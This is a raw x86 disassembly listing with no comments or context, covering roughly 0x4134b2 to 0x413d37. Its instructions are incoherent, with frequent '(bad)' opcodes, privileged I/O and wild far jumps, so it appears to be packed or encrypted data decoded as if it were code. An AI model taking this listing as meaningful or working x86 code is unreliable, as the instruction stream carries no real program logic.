  4134b2:	out    dx,al
  4134b3:	loop   0x413492
  4134b5:	out    dx,eax
  4134b6:	iret   
  4134b7:	div    DWORD PTR [ecx+edx*8-0x161a3920]
  4134be:	fdiv   QWORD PTR [ebp-0xe40052a]
  4134c4:	pop    es
  4134c5:	push   es
  4134c6:	cli    
  4134c7:	inc    edx
  4134c9:	mov    eax,0xdbd7e1fb
  4134ce:	out    dx,al
  4134cf:	repz push es
  4134d1:	add    ebp,DWORD PTR [edx-0x3d0c3720]
  4134d7:	loopne 0x41349f
  4134d9:	aam    0xf1
  4134db:	enter  0xf9da,0xd3
  4134df:	jmp    0x41349a
  4134e1:	add    edi,DWORD PTR [esi+edi*8-0x2041ff24]
  4134e8:	add    al,dh
  4134ea:	mov    edi,0xe2c8dbeb
  4134ef:	(bad)  
  4134f0:	enter  0xa7cf,0xcd
  4134f4:	out    0xc8,eax
  4134f6:	in     al,0xb3
  4134f8:	hlt    
  4134f9:	in     al,0xe5
  4134fb:	mov    ebx,0xf8ecb0c9
  413500:	not    al
  413502:	mov    ecx,0xd5f6ce
  413507:	cld    
  413508:	(bad)  
  413509:	add    eax,ecx
  41350b:	rol    dh,1
  41350d:	fldln2 
  41350f:	out    0xe,al
  413511:	add    eax,eax
  413513:	repnz rcl dl,cl
  413516:	shr    ch,0xb1
  413519:	mov    al,0xf6
  41351b:	retf   0xf0fb
  41351e:	fcmovnbe st,st(7)
  413520:	std    
  413521:	leave  
  413522:	hlt    
  413523:	hlt    
  413524:	mov    ebp,0xf2bed7d6
  413529:	jmp    0x4421b0c
  41352e:	dec    DWORD PTR [eax]
  413530:	jecxz  0x413514
  413532:	repz jmp 0x413518
  413535:	enter  0xc5e5,0xd1
  413539:	mov    ebx,0xcab1bbec
  41353e:	sti    
  41353f:	mov    eax,0xf502eddc
  413544:	out    0x6,al
  413546:	mov    bh,0xfc
  413549:	fsub   st(2),st
  41354b:	jmp    0x4ef:0x3c7c7ff
  413552:	loope  0x413504
  413554:	xlat   BYTE PTR ds:[ebx]
  413555:	repnz jmp 0xdec8:0xf5f9f5ca
  41355d:	ror    ah,cl
  41355f:	les    edi,FWORD PTR [edi-0x47402a09]
  413565:	fucomi st,st(4)
  413567:	add    dl,al
  413569:	mov    eax,0xfcc9e3e3
  41356e:	(bad)  
  41356f:	dec    esi
  413571:	clc    
  413572:	mov    edi,0xd6ecdde5
  413577:	jmp    0xc4db:0xebf3d3a9
  41357e:	cmc    
  41357f:	int3   
  413580:	lock rcr edx,cl
  413583:	loop   0x41355b
  413585:	mov    esp,0xdee4e3c7
  41358a:	(bad)
  41358d:	into   
  41358e:	out    0x0,al
  413590:	fld    DWORD PTR [edx]
  413592:	int    0xbc
  413594:	jmp    0xca1e2760
  413599:	rol    ah,1
  41359b:	mov    ebx,0xbaf4ccdb
  4135a0:	add    al,BYTE PTR [ebx]
  4135a2:	repz add esi,esp
  4135a5:	mov    ebp,0x5c7f7fb
  4135aa:	clc    
  4135ab:	sti    
  4135ac:	xlat   BYTE PTR ds:[ebx]
  4135ad:	stc    
  4135ae:	or     eax,0xc3fa06ce
  4135b3:	loop   0x413595
  4135b5:	scas   al,BYTE PTR es:[edi]
  4135b6:	shr    ah,1
  4135b8:	fcomi  st,st(4)
  4135ba:	mov    ch,0xed
  4135bc:	in     eax,0xf7
  4135be:	(bad)  
  4135c0:	xlat   BYTE PTR ds:[ebx]
  4135c1:	mov    esp,0xd007fa00
  4135c6:	add    eax,esp
  4135c8:	loopne 0x413594
  4135ca:	(bad)  
  4135cc:	jmp    0x4135b4
  4135ce:	iret   
  4135cf:	push   es
  4135d0:	jmp    0xd12627d8
  4135d5:	mov    cl,0xe0
  4135d7:	ror    dh,0xeb
  4135da:	call   0xf105fbcd
  4135df:	cli    
  4135e0:	add    dl,dh
  4135e2:	rcl    ebx,cl
  4135e4:	shl    edx,1
  4135e6:	(bad)  
  4135e8:	out    0xe9,al
  4135ea:	fisttp DWORD PTR [ebx]
  4135ec:	(bad)  
  4135ed:	cld    
  4135ee:	fcmove st,st(0)
  4135f0:	loopne 0x4135d2
  4135f2:	int    0xe1
  4135f4:	in     eax,0xd5
  4135f6:	shl    bl,cl
  4135f8:	cmc    
  4135f9:	rcr    edx,1
  4135fb:	jmp    0x4135e9
  4135fd:	aam    0xf4
  4135ff:	int3   
  413600:	out    dx,al
  413601:	hlt    
  413602:	rol    al,cl
  413604:	in     eax,dx
  413605:	loope  0x4135e7
  413607:	loope  0x4135e5
  413609:	add    al,0xd1
  41360b:	rol    esi,0xd
  41360e:	push   cs
  41360f:	out    0xdb,eax
  413611:	push   es
  413612:	fdiv   QWORD PTR [edx-0x52373339]
  413618:	repz (bad) 
  41361b:	loopne 0x413604
  41361d:	mov    bh,0xd4
  41361f:	in     al,0xe2
  413621:	xlat   BYTE PTR ds:[ebx]
  413622:	rol    ecx,cl
  413624:	out    dx,eax
  413625:	mov    edi,0xc1f9c404
  41362a:	in     al,0xfd
  41362c:	in     al,0x8
  41362e:	clc    
  41362f:	add    eax,0xd8ededde
  413634:	int3   
  413635:	bnd ret 
  413637:	hlt    
  413638:	(bad)  
  413639:	sar    BYTE PTR [ebx-0x260b0446],0xf9
  413640:	sar    DWORD PTR [edi-0x4218fe43],1
  413646:	jecxz  0x413609
  413648:	add    eax,0xfc7f8d2
  41364d:	iret   
  41364e:	pop    es
  41364f:	adc    ebx,esp
  413651:	add    ch,dh
  413653:	(bad)  
  413655:	call   0xe60c014b
  41365a:	(bad)
  41365d:	repz out dx,eax
  41365f:	shl    dl,cl
  413661:	hlt    
  413662:	loope  0x41365a
  413664:	ret    0xbdc7
  413667:	rol    ch,1
  413669:	ret    
  41366a:	loop   0x413641
  41366c:	test   DWORD PTR ds:0xdeeaedda,0xd5b3a8a9
  413676:	out    0xd5,eax
  413678:	test   edi,0xe6cbb6c9
  41367e:	aam    0xd5
  413680:	int    0xfb
  413682:	into   
  413683:	hlt    
  413684:	repz cli 
  413686:	cld    
  413687:	fiadd  DWORD PTR [esi]
  413689:	stc    
  41368a:	push   es
  41368b:	add    eax,0xeb02fde3
  413690:	pop    es
  413691:	(bad)  
  413692:	in     eax,dx
  413693:	loopne 0x413672
  413695:	mov    dh,0xdc
  413697:	repnz jmp 0xebcb:0xe6d6faf4
  41369f:	retf   
  4136a0:	hlt    
  4136a1:	int3   
  4136a2:	mov    bh,0xb9
  4136a4:	loop   0x413665
  4136a6:	(bad)  
  4136a8:	(bad)  
  4136aa:	leave  
  4136ab:	(bad)  
  4136ad:	jmp    0x413697
  4136af:	fisttp QWORD PTR [ebx]
  4136b1:	retf   0xdde9
  4136b4:	lods   eax,DWORD PTR ds:[esi]
  4136b5:	int    0xd2
  4136b7:	int3   
  4136b8:	ror    bh,cl
  4136ba:	shl    dl,cl
  4136bc:	into   
  4136bd:	fdivrp st(1),st
  4136bf:	mov    ch,0xdb
  4136c1:	(bad)  
  4136c2:	mov    eax,0xf1d2f2fc
  4136c7:	les    eax,FWORD PTR [eax]
  4136c9:	aam    0x1
  4136cb:	fld    st(1)
  4136cd:	or     edi,edi
  4136cf:	int3   
  4136d0:	out    0xe6,al
  4136d2:	mov    esp,0xb2efe1d0
  4136d7:	loop   0x4136c9
  4136d9:	ret    0xb1c9
  4136dc:	(bad)  
  4136dd:	xlat   BYTE PTR ds:[ebx]
  4136de:	(bad)  
  4136df:	aad    0xd3
  4136e1:	cli    
  4136e2:	hlt    
  4136e3:	loopne 0x4136b9
  4136e5:	stc    
  4136e6:	div    cl
  4136e8:	fcmovnu st,st(3)
  4136ea:	fsubr  st,st(7)
  4136ec:	or     esi,esi
  4136ee:	in     eax,dx
  4136ef:	call   0xae340ad7
  4136f4:	ret    0xcdd5
  4136f7:	shr    ch,cl
  4136f9:	loopne 0x4136ea
  4136fb:	(bad)  
  4136fe:	call   0xdc3b03b8
  413703:	loope  0x4136d4
  413705:	aad    0xd5
  413707:	fld    DWORD PTR ds:0xe06c101
  41370d:	in     eax,0xd4
  41370f:	fmul   st(6),st
  413711:	(bad)  
  413713:	mov    al,0xc6
  413715:	loop   0x4136c8
  413717:	mul    al
  413719:	shl    edi,1
  41371b:	(bad)  
  41371c:	int    0xcc
  41371e:	enter  0xf7d2,0xff
  413722:	rol    DWORD PTR [ebx],1
  413724:	fxtract 
  413726:	(bad)  
  413727:	repnz out 0xc3,eax
  41372a:	(bad)  
  41372b:	aad    0xfe
  41372d:	pop    es
  41372e:	add    eax,0xef03e706
  413733:	in     al,dx
  413734:	mov    bl,0xea
  413736:	in     eax,0xe0
  413738:	in     eax,0xd1
  41373a:	shr    BYTE PTR [esi-0x2e371b47],1
  413740:	loop   0x41373f
  413742:	ret    
  413743:	rcl    ebx,0xd3
  413746:	int3   
  413747:	(bad)  
  413748:	inc    edx
  41374a:	(bad)  
  41374b:	sti    
  41374c:	fsubrp st(4),st
  41374e:	(bad)
  413751:	(bad)  
  413752:	out    dx,eax
  413753:	out    0xb1,eax
  413755:	mov    dh,0xb0
  413757:	into   
  413758:	fidiv  DWORD PTR [ebx+esi*4-0x8471745]
  41375f:	out    dx,al
  413760:	fdiv   DWORD PTR [eax-0x1d2c2431]
  413766:	loope  0x413724
  413768:	mov    esp,0xa04dde4
  41376d:	(bad)  
  41376f:	add    ch,bl
  413771:	or     esp,eax
  413773:	in     al,0xdd
  413775:	(bad)  
  413776:	hlt    
  413777:	int    0xd4
  413779:	loopne 0x41373c
  41377b:	loopne 0x413752
  41377d:	stc    
  41377e:	sti    
  41377f:	fnop   
  413781:	mov    al,0xf4
  413783:	(bad)  
  413784:	loope  0x41376c
  413786:	aad    0xc5
  413788:	in     eax,0xc3
  41378a:	aam    0xc0
  41378c:	clc    
  41378d:	loope  0x413793
  41378f:	jecxz  0x413784
  413791:	add    ch,ah
  413793:	out    0xd7,eax
  413795:	out    dx,eax
  413796:	retf   
  413797:	in     al,0xcf
  413799:	jmp    0x413782
  41379b:	hlt    
  41379c:	cmc    
  41379d:	retf   0xbbd0
  4137a0:	clc    
  4137a1:	out    dx,al
  4137a2:	loopne 0x413791
  4137a4:	mov    ebp,0xf0dddcc6
  4137a9:	shl    cl,0xd9
  4137ac:	fdivr  st,st(4)
  4137ae:	mov    BYTE PTR ds:0xf2c7dadf,0xc6
  4137b5:	in     al,0xf3
  4137b7:	aad    0xc9
  4137b9:	aam    0xda
  4137bb:	mov    ch,0xe9
  4137bd:	cli    
  4137be:	mov    ebp,0xbafaf6ee
  4137c3:	loop   0x413791
  4137c5:	push   es
  4137c6:	mov    ebx,0xbfd0c3e2
  4137cb:	add    esp,esi
  4137cd:	fisttp WORD PTR [ebx]
  4137cf:	ret    0xf907
  4137d2:	(bad)  
  4137d4:	xlat   BYTE PTR ds:[ebx]
  4137d5:	in     eax,0xb2
  4137d7:	mov    cl,0xd0
  4137d9:	jmp    0x4137bf
  4137db:	stc    
  4137dc:	lock mov ebx,0xc8b1cdd6
  4137e2:	mov    esi,0xe0c6fbba
  4137e7:	fiadd  DWORD PTR [ebx]
  4137e9:	cmc    
  4137ea:	test   BYTE PTR [edi+ecx*1],0xce
  4137ee:	cld    
  4137ef:	clc    
  4137f0:	out    0xee,eax
  4137f2:	shl    ecx,1
  4137f4:	out    0xb0,eax
  4137f6:	repz out 0xc8,eax
  4137f9:	int3   
  4137fa:	fdivr  DWORD PTR [eax-0x450d3937]
  413800:	jmp    0xd73224e3
  413805:	(bad)  
  413807:	loopne 0x4137df
  413809:	shl    ah,1
  41380b:	or     dl,ah
  41380d:	loope  0x413813
  41380f:	in     eax,dx
  413810:	repnz retf 0xb2c9
  413814:	int3   
  413815:	ffree  st(1)
  413817:	mul    ecx
  413819:	in     eax,0xd5
  41381b:	mov    ch,0xdf
  41381d:	stc    
  41381e:	repz mov eax,0xc8bef7e2
  413824:	add    cl,ah
  413826:	(bad)
  413829:	std    
  41382a:	loope  0x413817
  41382c:	leave  
  41382d:	add    al,0xf4
  41382f:	sti    
  413830:	(bad)  
  413831:	out    dx,al
  413832:	out    0xeb,al
  413834:	fsub   st(2),st
  413836:	(bad)  
  413837:	fdivr  st(5),st
  413839:	loop   0x413826
  41383b:	jmp    0xcd2c0b28
  413840:	into   
  413841:	cld    
  413842:	int    0xf9
  413844:	(bad)  
  413845:	rcr    ebp,cl
  413847:	div    edx
  413849:	or     dh,cl
  41384b:	in     al,0x0
  41384d:	fsub   st(4),st
  41384f:	jmp    0xf1e5:0xbdc3e8fc
  413856:	mov    dh,0xe0
  413858:	(bad)  
  413859:	cli    
  41385a:	(bad)  
  41385b:	neg    edx
  41385d:	leave  
  41385e:	out    dx,eax
  41385f:	sti    
  413860:	jmp    0x413850
  413862:	sti    
  413863:	add    al,BYTE PTR [edi]
  413865:	aam    0x1
  413867:	repz push es
  413869:	add    eax,0xc0dfe1d0
  41386e:	add    DWORD PTR [edx],eax
  413870:	or     cl,cl
  413872:	mov    ebp,0xd5c6b3df
  413877:	shl    ah,0xd6
  41387a:	cli    
  41387b:	clc    
  41387c:	lods   eax,DWORD PTR ds:[esi]
  41387d:	leave  
  41387e:	out    dx,al
  41387f:	shl    DWORD PTR [ebp+0x2dbc2d2],cl
  413885:	f2xm1  
  413887:	ret    0xd7de
  41388a:	or     eax,esi
  41388c:	shl    ebp,0xca
  41388f:	stc    
  413890:	(bad)  
  413891:	fld    st(7)
  413893:	lods   eax,DWORD PTR ds:[esi]
  413894:	loope  0x413889
  413896:	shl    DWORD PTR [ebp-0x2c072f37],1
  41389c:	mov    ah,0xf0
  41389e:	mov    bh,0xf5
  4138a0:	(bad)  
  4138a2:	call   0xcd2f15a1
  4138a7:	xlat   BYTE PTR ds:[ebx]
  4138a8:	rol    esi,1
  4138aa:	add    eax,DWORD PTR [eax]
  4138ac:	ffree  st(5)
  4138ae:	add    al,0xe0
  4138b0:	lds    ecx,FWORD PTR [esp+eiz*8]
  4138b3:	int3   
  4138b4:	fild   QWORD PTR [ebp-0x571a1f1e]
  4138ba:	repz jmp 0x413893
  4138bd:	in     eax,dx
  4138be:	mov    ebx,0xcedabdd0
  4138c3:	mov    esp,0xf7d7ef
  4138c8:	ffree  st(0)
  4138ca:	mov    eax,0xe4c9e0dc
  4138d0:	cli    
  4138d1:	clc    
  4138d2:	jmp    0x4138a4
  4138d4:	shl    ebp,1
  4138d6:	aad    0xac
  4138d8:	(bad)  
  4138d9:	mov    bl,0xd4
  4138db:	cmc    
  4138dc:	fidivr WORD PTR [edx-0x2a262b2b]
  4138e2:	cld    
  4138e3:	rcr    edi,0x0
  4138e6:	(bad)  
  4138e7:	int3   
  4138e8:	mov    ebp,0xf705fafb
  4138ed:	into   
  4138ee:	in     al,dx
  4138ef:	enter  0xefdb,0xd1
  4138f3:	faddp  st(5),st
  4138f5:	lods   al,BYTE PTR ds:[esi]
  4138f6:	mov    al,0xb5
  4138f8:	repnz idiv edx
  4138fb:	rcl    edi,cl
  4138fd:	mov    eax,0xc2dff0dd
  413902:	cli    
  413903:	lock pop es
  413905:	repz ror esp,0xfb
  413909:	test   BYTE PTR [ebx],0xdd
  41390c:	in     al,0xd4
  41390e:	leave  
  41390f:	add    al,ch
  413911:	ror    dl,0xdf
  413914:	xlat   BYTE PTR ds:[ebx]
  413915:	mov    ebp,0xe8d3eaaf
  41391a:	iret   
  41391b:	fucomip st,st(2)
  41391d:	fld    st(5)
  41391f:	shl    esi,cl
  413921:	fsubr  st,st(5)
  413923:	out    0xed,eax
  413925:	repnz fndisi(8087 only) 
  413928:	add    ebx,edi
  41392a:	add    ch,al
  41392c:	fild   DWORD PTR [edi]
  41392e:	clc    
  41392f:	int3   
  413930:	(bad)  
  413932:	retf   
  413933:	ret    
  413934:	int    0xe7
  413936:	in     eax,0xb1
  413938:	aam    0xc8
  41393a:	lock clc 
  41393c:	out    0xf3,eax
  41393e:	in     eax,0xf2
  413940:	cli    
  413941:	loop   0x413923
  413943:	enter  0xced6,0xc0
  413947:	fdivr  st,st(5)
  413949:	std    
  41394a:	or     edi,esi
  41394c:	cmc    
  41394d:	out    dx,al
  41394e:	sti    
  41394f:	jmp    0xc7cb:0xc5cfe5f8
  413956:	mov    bl,0xe0
  413958:	out    0xc7,eax
  41395a:	scas   eax,DWORD PTR es:[edi]
  41395b:	iret   
  41395c:	hlt    
  41395d:	in     eax,0xf2
  41395f:	mov    ch,0xfc
  413961:	jmp    0xe8241522
  413966:	(bad)  
  413967:	fcmovnb st,st(0)
  413969:	fcmovnu st,st(2)
  41396b:	retf   
  41396c:	add    cl,BYTE PTR [eax]
  41396e:	(bad)
  413971:	rcl    bl,cl
  413973:	shl    ecx,1
  413975:	retf   
  413976:	fdivr  st(2),st
  413978:	retf   
  413979:	call   0xfc06f444
  41397e:	retf   
  41397f:	mov    ecx,0xd3fbcef4
  413984:	mov    edi,0xfcc6d9f5
  413989:	fcomp  st(6)
  41398b:	add    dl,dh
  41398d:	or     dh,bl
  41398f:	lds    edx,FWORD PTR [edx]
  413991:	retf   0xb2c0
  413994:	rcl    al,0xee
  413997:	mov    cl,0xc8
  413999:	leave  
  41399a:	shl    ah,1
  41399c:	rcr    cl,cl
  41399e:	shl    bh,1
  4139a0:	ret    
  4139a1:	loope  0x413990
  4139a3:	add    bl,cl
  4139a5:	(bad)  
  4139a6:	icebp  
  4139a7:	add    edx,edx
  4139a9:	fdiv   st,st(4)
  4139ab:	(bad)  
  4139ac:	out    0xc8,eax
  4139ae:	in     al,0xfd
  4139b0:	jmp    0x413996
  4139b2:	mov    eax,0xf1edcae5
  4139b7:	int    0xb7
  4139b9:	cmc    
  4139ba:	shl    eax,0xde
  4139bd:	lock mov eax,0x1f5e9dc
  4139c3:	std    
  4139c4:	std    
  4139c5:	fcmovnu st,st(0)
  4139c7:	xlat   BYTE PTR ds:[ebx]
  4139c8:	rol    DWORD PTR [edi],0xfd
  4139cb:	hlt    
  4139cc:	jmp    0xc7fa:0x6dfc9c8
  4139d3:	in     al,0xf1
  4139d5:	lods   eax,DWORD PTR ds:[esi]
  4139d6:	xlat   BYTE PTR ds:[ebx]
  4139d7:	sti    
  4139d8:	ret    
  4139d9:	fcomi  st,st(0)
  4139db:	leave  
  4139dc:	retf   0xd4f7
  4139df:	mov    edx,0xbffad7f1
  4139e4:	in     eax,dx
  4139e5:	add    cl,dh
  4139e7:	(bad)  
  4139e9:	sti    
  4139ea:	dec    edx
  4139ec:	std    
  4139ed:	cld    
  4139ee:	aam    0xdc
  4139f0:	enter  0xc106,0xec
  4139f4:	xlat   BYTE PTR ds:[ebx]
  4139f5:	fisubr WORD PTR [ebx-0x1b1e2905]
  4139fb:	repz (bad) 
  4139fd:	jmp    0xf1e8:0xd4efcfd2
  413a04:	fiadd  DWORD PTR [esi]
  413a06:	in     eax,0xc5
  413a08:	aam    0xfa
  413a0a:	jecxz  0x413a17
  413a0c:	fimul  WORD PTR [edi]
  413a0e:	(bad)  
  413a0f:	fimul  DWORD PTR [edi]
  413a11:	loop   0x4139cf
  413a13:	into   
  413a14:	test   eax,0xcfcbc2d0
  413a19:	int3   
  413a1a:	mov    bl,0xd6
  413a1c:	mov    edx,0xd5f7ceeb
  413a21:	xlat   BYTE PTR ds:[ebx]
  413a22:	into   
  413a23:	fsubrp st(2),st
  413a25:	in     al,dx
  413a26:	pop    es
  413a27:	repnz in al,0xd7
  413a2a:	add    eax,0xc5cfc0d4
  413a2f:	or     edi,eax
  413a31:	in     al,dx
  413a32:	mov    dl,0xe1
  413a34:	test   eax,0xcdc2eeab
  413a3a:	mov    bl,0xf7
  413a3c:	mov    edi,0xefc9facc
  413a41:	in     al,dx
  413a42:	fsincos 
  413a44:	ret    0xdfda
  413a47:	loope  0x413a4d
  413a49:	cld    
  413a4a:	add    ch,dh
  413a4c:	les    eax,FWORD PTR [edi]
  413a4e:	loope  0x413a33
  413a50:	in     eax,dx
  413a51:	jecxz  0x413a15
  413a53:	in     eax,dx
  413a54:	loop   0x413a09
  413a56:	lods   al,BYTE PTR ds:[esi]
  413a57:	hlt    
  413a58:	mov    al,0xea
  413a5a:	mov    bl,0xf6
  413a5c:	mov    edi,0xd3b2eed0
  413a61:	into   
  413a62:	lock repnz out dx,al
  413a65:	in     eax,0xf0
  413a67:	clc    
  413a68:	fcomi  st,st(2)
  413a6a:	hlt    
  413a6b:	fcmovnu st,st(0)
  413a6d:	out    dx,al
  413a6e:	jecxz  0x413a78
  413a70:	iret   
  413a71:	cld    
  413a72:	iret   
  413a73:	jmp    0xebc6:0xb4d3deac
  413a7a:	out    0xea,eax
  413a7c:	into   
  413a7d:	in     eax,dx
  413a7e:	mov    eax,0xe8eddcd3
  413a83:	sar    eax,cl
  413a85:	idiv   esp
  413a87:	(bad)  
  413a89:	repnz (bad) 
  413a8b:	aam    0xc5
  413a8d:	in     eax,dx
  413a8e:	bswap  edi
  413a90:	iret   
  413a91:	or     ch,BYTE PTR [esi-0x28174230]
  413a97:	mov    dh,0xdb
  413a99:	jmp    0xebdd:0xfeb4b8b3
  413aa0:	loop   0x413a75
  413aa2:	jmp    0xdc4041ae
  413aa7:	mov    esp,0xe5fcc3f6
  413aac:	or     eax,DWORD PTR [esi]
  413aae:	loope  0x413abe
  413ab0:	or     eax,0xe2d1dcee
  413ab5:	lods   al,BYTE PTR ds:[esi]
  413ab6:	mov    ebp,0xe0b7a9d5
  413abb:	enter  0xf7eb,0xf0
  413abf:	div    dl
  413ac1:	fstp   TBYTE PTR [esi+esi*8+0xbccf107]
  413ac8:	xlat   BYTE PTR ds:[ebx]
  413ac9:	loope  0x413aa8
  413acb:	(bad)  
  413acc:	or     eax,eax
  413ace:	(bad)  
  413acf:	(bad)  
  413ad0:	fisttp DWORD PTR ds:0xf3f2eeee
  413ad6:	(bad)
  413ad9:	sti    
  413ada:	repnz in eax,dx
  413adc:	jmp    0x413aad
  413ade:	shl    ch,cl
  413ae0:	out    dx,eax
  413ae1:	lock (bad) 
  413ae3:	fcmovu st,st(7)
  413ae5:	rcr    ch,0xc2
  413ae8:	out    0xc1,eax
  413aea:	aam    0x1
  413aec:	add    BYTE PTR [ebx],al
  413aee:	(bad)  
  413af0:	fimul  WORD PTR [esi]
  413af2:	mov    eax,0xe2ddf3ea
  413af7:	ror    dl,0xb4
  413afa:	icebp  
  413afb:	call   0xe5350ef9
  413b00:	mov    edx,0xe0d5d0f4
  413b05:	std    
  413b06:	pop    es
  413b07:	fidivr DWORD PTR [ecx-0x151ff83c]
  413b0d:	call   0xf84c42f6
  413b12:	fdivr  DWORD PTR [ebp-0x1531084f]
  413b18:	iret   
  413b19:	(bad)  
  413b1a:	loopne 0x413b09
  413b1c:	enter  0xcbfe,0xb9
  413b20:	int    0xc3
  413b22:	fidivr WORD PTR [ebp+edx*8+0x7f7e603]
  413b29:	(bad)  
  413b2a:	(bad)  
  413b2b:	(bad)  
  413b2c:	cmc    
  413b2d:	or     DWORD PTR [esi+eax*1],ecx
  413b30:	(bad)  
  413b32:	into   
  413b33:	out    0xca,eax
  413b35:	enter  0xd3c1,0xfa
  413b39:	into   
  413b3a:	shl    DWORD PTR [esi-0x22040138],0xb8
  413b41:	add    ebp,ebp
  413b43:	out    dx,al
  413b44:	fdivrp st(2),st
  413b46:	(bad)  
  413b48:	rol    DWORD PTR [edx+edi*8],1
  413b4b:	fsub   st,st(6)
  413b4d:	pop    es
  413b4e:	fimul  WORD PTR [eax]
  413b50:	cli    
  413b51:	or     eax,0xd6cac7c5
  413b56:	in     eax,0xea
  413b58:	jmp    0xf82ff337
  413b5d:	mov    esi,0xe1fdbbda
  413b62:	add    bl,dl
  413b64:	(bad)  
  413b66:	loope  0x413b4c
  413b68:	mov    ebp,0xae9fdc2
  413b6d:	or     bl,al
  413b6f:	retf   
  413b70:	loope  0x413b45
  413b72:	mov    bl,0xbe
  413b74:	loop   0x413b36
  413b76:	retf   
  413b77:	leave  
  413b78:	shl    BYTE PTR [eax-0x2944254d],1
  413b7e:	mov    ah,0xfd
  413b80:	clc    
  413b81:	not    bl
  413b83:	(bad)  
  413b85:	in     eax,dx
  413b86:	mov    ebx,0xc4b8e2c7
  413b8b:	rcl    ah,0xf6
  413b8e:	call   0xe21a2a81
  413b93:	in     al,dx
  413b94:	jmp    0xfac2:0xe6e6e2ef
  413b9b:	fidiv  DWORD PTR [ebp-0x2363529]
  413ba1:	mov    ebx,0xdcd6d3e8
  413ba6:	(bad)  
  413ba8:	fcmovb st,st(1)
  413baa:	stc    
  413bab:	enter  0xe7,0xd9
  413baf:	sysret 
  413bb1:	(bad)  
  413bb2:	(bad)  
  413bb4:	mov    bh,0xd6
  413bb6:	(bad)  
  413bb7:	mov    cl,0xe1
  413bb9:	stc    
  413bba:	in     eax,0xcb
  413bbc:	repz int 0xbe
  413bbf:	leave  
  413bc0:	mov    ch,0xe2
  413bc2:	leave  
  413bc3:	mov    dh,0xd0
  413bc5:	fadd   DWORD PTR [ecx]
  413bc7:	mov    esp,0x70601f9
  413bcc:	push   es
  413bcd:	aad    0xdc
  413bcf:	fsubrp st(5),st
  413bd1:	retf   0xe1af
  413bd4:	sar    DWORD PTR [esp+edx*8-0x370d3a2e],cl
  413bdb:	retf   
  413bdc:	fdivrp st(6),st
  413bde:	jmp    0x413b9e
  413be0:	ror    dh,cl
  413be2:	icebp  
  413be3:	(bad)  
  413be4:	xlat   BYTE PTR ds:[ebx]
  413be5:	add    esp,edx
  413be7:	out    0xb9,eax
  413be9:	cmc    
  413bea:	or     eax,ebp
  413bec:	in     eax,0xcf
  413bee:	fsubr  st(3),st
  413bf0:	ror    DWORD PTR [eiz*8-0x37172f48],cl
  413bf7:	leave  
  413bf8:	int    0xc0
  413bfa:	fcom   st(5)
  413bfc:	(bad)  
  413bfd:	rcr    ebx,1
  413bff:	(bad)  
  413c01:	mov    ebp,0xf4c1ddc2
  413c06:	in     eax,dx
  413c07:	in     al,0xdc
  413c09:	or     dh,ch
  413c0b:	enter  0xeff,0xdd
  413c0f:	dec    DWORD PTR [esp+eax*8]
  413c12:	lock enter 0xccb3,0xc1
  413c17:	shl    DWORD PTR [ecx-0x322a1334],1
  413c1d:	(bad)  
  413c1e:	(bad)  
  413c1f:	hlt    
  413c20:	fcom   st(7)
  413c22:	(bad)  
  413c24:	cld    
  413c25:	jmp    ecx
  413c27:	loope  0x413c09
  413c29:	std    
  413c2a:	jecxz  0x413c2f
  413c2c:	retf   
  413c2d:	call   0xcb44380a
  413c32:	call   0xd2232e18
  413c37:	iret   
  413c38:	(bad)  
  413c39:	in     al,dx
  413c3a:	clc    
  413c3b:	iret   
  413c3c:	(bad)  
  413c3d:	(bad)  
  413c3e:	div    DWORD PTR [ebp-0x172a3724]
  413c44:	sti    
  413c45:	rol    DWORD PTR [edi],1
  413c47:	or     esi,ecx
  413c49:	std    
  413c4a:	jmp    0x413c57
  413c4c:	push   cs
  413c4d:	add    dl,bh
  413c4f:	adc    ebp,esp
  413c51:	call   0xb1f40337
  413c56:	cmc    
  413c57:	jecxz  0x413c3f
  413c59:	lock call 0xb80e2b39
  413c5f:	sti    
  413c60:	in     eax,dx
  413c61:	int3   
  413c62:	cmc    
  413c63:	sti    
  413c64:	loop   0x413c4d
  413c66:	fdivr  st,st(0)
  413c68:	(bad)  
  413c69:	loope  0x413c32
  413c6b:	cli    
  413c6c:	or     bh,ah
  413c6e:	ftst   
  413c70:	into   
  413c71:	fnstenv [ecx-0x3b350940]
  413c77:	test   ecx,0xc4dfd4a8
  413c7d:	cli    
  413c7e:	fcmovbe st,st(1)
  413c80:	add    esi,DWORD PTR [ebx+eax*1-0x3223382f]
  413c87:	clc    
  413c88:	retf   
  413c89:	fld    QWORD PTR [esi]
  413c8b:	(bad)
  413c8e:	or     eax,0xafceeccd
  413c93:	out    dx,al
  413c94:	(bad)  
  413c95:	mov    ebp,0xa8e8c9af
  413c9a:	cli    
  413c9b:	cli    
  413c9c:	mov    edi,0xfdebb3df
  413ca1:	out    dx,eax
  413ca2:	(bad)  
  413ca4:	inc    DWORD PTR ds:0xc3fedffe
  413caa:	fdivr  st,st(0)
  413cac:	div    ah
  413cae:	or     esi,eax
  413cb0:	cli    
  413cb1:	(bad)  
  413cb2:	fdivr  DWORD PTR [ebp-0x194e0f42]
  413cb8:	int3   
  413cb9:	into   
  413cba:	retf   0xc7f2
  413cbd:	mov    ch,0xf3
  413cbf:	aam    0xcc
  413cc1:	rol    DWORD PTR [edx],cl
  413cc3:	test   ecx,0xfcded8d8
  413cc9:	add    eax,0xf6e6f4df
  413cce:	aad    0xfe
  413cd0:	retf   
  413cd1:	int    0xee
  413cd3:	test   al,0xa9
  413cd5:	repz in eax,dx
  413cd7:	lock fucomi st,st(7)
  413cda:	in     al,0xd2
  413cdc:	hlt    
  413cdd:	sar    BYTE PTR [esi+0xffcbcb],cl
  413ce3:	mov    edx,0xde00e103
  413ce8:	repnz fdiv st(5),st
  413ceb:	cmpxchg8b QWORD PTR [eax]
  413cee:	int    0xce
  413cf0:	(bad)  
  413cf2:	jmp    0xf7d3:0xb6c2d1ce
  413cf9:	mov    ah,0xc9
  413cfb:	mov    ebx,0xb5d9f8eb
  413d00:	enter  0xfd03,0xbd
  413d04:	into   
  413d05:	jecxz  0x413cf3
  413d07:	add    eax,0xc9ded1c4
  413d0c:	out    dx,al
  413d0d:	(bad)  
  413d0f:	fmul   QWORD PTR [edx]
  413d11:	out    dx,eax
  413d12:	mov    bl,0xc1
  413d14:	call   0xb703fec9
  413d19:	sti    
  413d1a:	sar    BYTE PTR [eax-0x317452f],1
  413d20:	retf   0xbb03
  413d23:	aam    0xe2
  413d25:	add    edi,DWORD PTR [esi-0x1efa0506]
  413d2b:	cld    
  413d2c:	sar    DWORD PTR [esp+eax*8-0x50f5f823],0xb1
  413d34:	int3   
  413d35:	test   al,0xaf
  413d37:	shl    ah,cl
